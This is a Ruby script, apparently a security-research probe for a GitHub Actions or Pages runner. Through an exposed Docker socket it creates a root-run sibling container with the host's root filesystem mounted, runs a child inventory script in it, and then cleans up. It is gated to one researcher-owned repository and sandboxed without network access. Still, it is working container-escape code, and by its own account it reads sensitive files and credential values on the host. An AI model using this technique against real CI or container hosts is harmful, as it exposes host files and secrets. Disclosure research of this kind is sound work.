# frozen_string_literal: true

require "json"
require "securerandom"
require "socket"

SOURCE_REPOSITORY = "singetu0096/pages-post-url-regexp-canary-20260915"
CHILD_FILENAME = "31-host-inventory-child.rb"
HOST_ROOT_BIND = "/:/owned-host-root:ro"

def docker_request(method, request_path, request_body = "")
  socket = UNIXSocket.new("/var/run/docker.sock")
  crlf = 13.chr + 10.chr
  socket.write([
    method + " " + request_path + " HTTP/1.0",
    "Host: localhost",
    "Connection: close",
    "Content-Type: application/json",
    "Content-Length: " + request_body.bytesize.to_s,
    "",
    request_body
  ].join(crlf))
  raw = socket.read
  status = raw.lines.first.to_s.split[1].to_i
  body = raw.partition(crlf + crlf)[2]
  [status, body]
rescue StandardError
  [0, ""]
ensure
  socket.close if defined?(socket) && socket
end

def docker_get(request_path)
  docker_request("GET", request_path)
end

def docker_counts
  status, body = docker_get("/info")
  counts = {}
  if status == 200
    parsed = JSON.parse(body)
    %w[Containers ContainersRunning ContainersPaused ContainersStopped].each do |key|
      counts[key] = Integer(parsed[key]) if parsed.key?(key)
    end
  end
  [status, counts]
rescue StandardError
  [status || 0, {"parse_error" => true}]
ensure
  body = nil
  parsed = nil
end

result = {
  "probe" => "runner-hca-authority-classification-v2",
  "authorized_context" => {
    "github_actions" => ENV.fetch("GITHUB_ACTIONS", "") == "true",
    "source_repository" => ENV.fetch("GITHUB_REPOSITORY", "") == SOURCE_REPOSITORY
  },
  "safety_design" => {
    "researcher_owned_repository_only" => true,
    "planned_container_create_requests" => 1,
    "maximum_container_start_requests" => 1,
    "maximum_container_delete_requests" => 1,
    "host_root_bind_read_only" => true,
    "container_network_mode_none" => true,
    "container_network_disabled" => true,
    "privileged" => false,
    "host_namespace_requests" => 0,
    "device_requests" => 0,
    "capabilities_dropped_all" => true,
    "no_new_privileges" => true,
    "host_file_writes_by_payload" => 0,
    "sensitive_file_content_reads" => 1,
    "credential_values_read_for_local_classification" => 1,
    "credential_values_used_in_requests" => 0,
    "credential_values_retained" => false,
    "host_process_environment_reads" => 0,
    "host_process_command_line_reads" => 0,
    "network_requests_from_inventory_container" => 0,
    "internal_peer_requests" => 0,
    "cloud_api_requests" => 0,
    "hypervisor_device_writes" => 0,
    "credential_values_emitted" => false,
    "raw_paths_or_addresses_emitted" => false
  }
}

unless result.dig("authorized_context", "github_actions") &&
       result.dig("authorized_context", "source_repository")
  result["refused_outside_exact_context"] = true
  puts JSON.generate(result)
  exit
end

workspace = ENV.fetch("GITHUB_WORKSPACE", "")
child_path = File.join(workspace, CHILD_FILENAME)
unless !workspace.empty? && File.file?(child_path)
  result["child_source_missing"] = true
  puts JSON.generate(result)
  exit
end

child_source = File.binread(child_path)
unless child_source.bytesize.between?(1, 32_768)
  result["child_source_size_refused"] = true
  puts JSON.generate(result)
  exit
end

self_name = Socket.gethostname
self_status, self_body = docker_get("/containers/" + self_name + "/json")
self_image_id = nil
self_id_match = false
if self_status == 200
  begin
    self_json = JSON.parse(self_body)
    self_id = self_json.fetch("Id", "").to_s
    self_id_match = self_name.length >= 12 && self_id.start_with?(self_name)
    self_image_id = self_json.fetch("Image", "").to_s if self_id_match
  rescue StandardError
    self_id_match = false
  end
end
self_body = nil
self_json = nil
self_id = nil

inventory_run = {
  "configured" => true,
  "self_inspect_status" => self_status,
  "self_id_match" => self_id_match,
  "host_root_bind" => "read-only",
  "start_request_sent" => false,
  "exec_request_sent" => false,
  "host_write_attempted" => false
}

baseline_status, baseline_counts = docker_counts
inventory_run["baseline_info_status"] = baseline_status
canary_name = "pages-rce-hca-authority-" + SecureRandom.hex(8)
canary_id = nil
created_by_probe = false
started_by_probe = false

if self_image_id.to_s.match?(/\Asha256:[0-9a-f]{64}\z/)
  create_body = JSON.generate(
    "Image" => self_image_id,
    "Entrypoint" => ["/usr/local/bin/ruby", "-W0", "-e", child_source],
    "Cmd" => [],
    "User" => "0:0",
    "WorkingDir" => "/",
    "Env" => ["HOST_ROOT=/owned-host-root"],
    "NetworkDisabled" => true,
    "AttachStdin" => false,
    "AttachStdout" => true,
    "AttachStderr" => true,
    "OpenStdin" => false,
    "StdinOnce" => false,
    "Tty" => true,
    "Labels" => {
      "com.github.security-research.owned-canary" => "true",
      "com.github.security-research.hca-authority" => "offline-classification-only"
    },
    "StopTimeout" => 2,
    "HostConfig" => {
      "AutoRemove" => false,
      "Binds" => [HOST_ROOT_BIND],
      "CapAdd" => [],
      "CapDrop" => ["ALL"],
      "Devices" => [],
      "DeviceRequests" => [],
      "IpcMode" => "private",
      "LogConfig" => {
        "Type" => "json-file",
        "Config" => {"max-size" => "64k", "max-file" => "1"}
      },
      "Memory" => 134_217_728,
      "MemorySwap" => 134_217_728,
      "NanoCpus" => 100_000_000,
      "NetworkMode" => "none",
      "PidsLimit" => 32,
      "PortBindings" => {},
      "Privileged" => false,
      "PublishAllPorts" => false,
      "ReadonlyRootfs" => true,
      "RestartPolicy" => {"Name" => "no", "MaximumRetryCount" => 0},
      "SecurityOpt" => ["no-new-privileges"]
    }
  )

  begin
    create_status, create_response = docker_request(
      "POST",
      "/containers/create?name=" + canary_name,
      create_body
    )
    inventory_run["create_status"] = create_status
    created_by_probe = create_status == 201
    if created_by_probe
      canary_id = JSON.parse(create_response).fetch("Id", "").to_s
      inspect_status, inspect_response = docker_get(
        "/containers/" + canary_id + "/json"
      )
      inventory_run["prestart_inspect_status"] = inspect_status
      if inspect_status == 200
        inspect_json = JSON.parse(inspect_response)
        config = inspect_json.fetch("Config", {})
        host_config = inspect_json.fetch("HostConfig", {})
        inventory_run["constraints_accepted"] = {
          "host_root_readonly_bind" =>
            Array(host_config["Binds"]).include?(HOST_ROOT_BIND),
          "network_none" => host_config["NetworkMode"].to_s == "none",
          "network_disabled" => !!config["NetworkDisabled"],
          "privileged_false" => !host_config["Privileged"],
          "pid_mode_not_host" => host_config["PidMode"].to_s != "host",
          "ipc_mode_not_host" => host_config["IpcMode"].to_s != "host",
          "uts_mode_not_host" => host_config["UTSMode"].to_s != "host",
          "readonly_rootfs" => !!host_config["ReadonlyRootfs"],
          "cap_add_empty" => Array(host_config["CapAdd"]).empty?,
          "cap_drop_all" => Array(host_config["CapDrop"]).any? do |entry|
            entry.to_s.casecmp("all").zero?
          end,
          "no_new_privileges" =>
            Array(host_config["SecurityOpt"]).any? do |entry|
              entry.to_s.include?("no-new-privileges")
            end,
          "device_count_zero" => Array(host_config["Devices"]).empty?,
          "device_request_count_zero" =>
            Array(host_config["DeviceRequests"]).empty?,
          "memory_limit_exact" =>
            host_config["Memory"].to_i == 134_217_728,
          "pids_limit_exact" => host_config["PidsLimit"].to_i == 32,
          "restart_policy_none" =>
            host_config.dig("RestartPolicy", "Name").to_s == "no"
        }
      end

      accepted_constraints = inventory_run.fetch("constraints_accepted", {})
      constraints_ok = inspect_status == 200 &&
        accepted_constraints.length == 16 &&
        accepted_constraints.values.all?
      if constraints_ok
        start_status, = docker_request(
          "POST",
          "/containers/" + canary_id + "/start"
        )
        inventory_run["start_request_sent"] = true
        inventory_run["start_status"] = start_status
        started_by_probe = start_status == 204
      else
        inventory_run["start_refused_due_to_constraint_mismatch"] = true
      end

      if started_by_probe
        120.times do
          state_status, state_response = docker_get(
            "/containers/" + canary_id + "/json"
          )
          break unless state_status == 200

          state_json = JSON.parse(state_response)
          state = state_json.fetch("State", {})
          if !state["Running"]
            inventory_run["exit_code_zero"] =
              state.fetch("ExitCode", -1).to_i == 0
            break
          end
          sleep 0.05
        rescue StandardError
          break
        end

        logs_status, logs_body = docker_get(
          "/containers/" + canary_id + "/logs?stdout=1&stderr=1&timestamps=0"
        )
        inventory_run["logs_status"] = logs_status
        if logs_status == 200 && logs_body.bytesize <= 65_536
          begin
            first = logs_body.index("{")
            last = logs_body.rindex("}")
            child_result = if first && last && last >= first
              JSON.parse(logs_body.byteslice(first, last - first + 1))
            end
            if child_result.is_a?(Hash) &&
               child_result["probe"] == "hca-authority-offline-classification-v2"
              inventory_run["inventory"] = child_result
              inventory_run["inventory_validated"] = true
            else
              inventory_run["inventory_validated"] = false
            end
          rescue StandardError
            inventory_run["inventory_validated"] = false
          end
        end
      end
    end
  rescue StandardError
    inventory_run["probe_error"] = true
  ensure
    create_body = nil
    create_response = nil
    inspect_response = nil
    inspect_json = nil
    config = nil
    host_config = nil
    accepted_constraints = nil
    state_response = nil
    state_json = nil
    state = nil
    logs_body = nil
    child_result = nil
    if created_by_probe && !canary_id.to_s.empty?
      delete_status, = docker_request(
        "DELETE",
        "/containers/" + canary_id + "?force=1&v=1"
      )
      inventory_run["delete_status"] = delete_status
    end
  end
else
  inventory_run["image_id_unavailable"] = true
end

post_cleanup_status, post_cleanup_counts = docker_counts
inventory_run["post_cleanup_info_status"] = post_cleanup_status
inventory_run["counts_returned_to_baseline"] =
  baseline_counts == post_cleanup_counts
inventory_run["created_by_probe"] = created_by_probe
inventory_run["started_by_probe"] = started_by_probe
inventory_run["deleted_by_probe"] = inventory_run["delete_status"] == 204
result["inventory_run"] = inventory_run

child_source = nil
child_path = nil
self_image_id = nil
canary_id = nil
canary_name = nil
baseline_counts = nil
post_cleanup_counts = nil

puts JSON.generate(result)
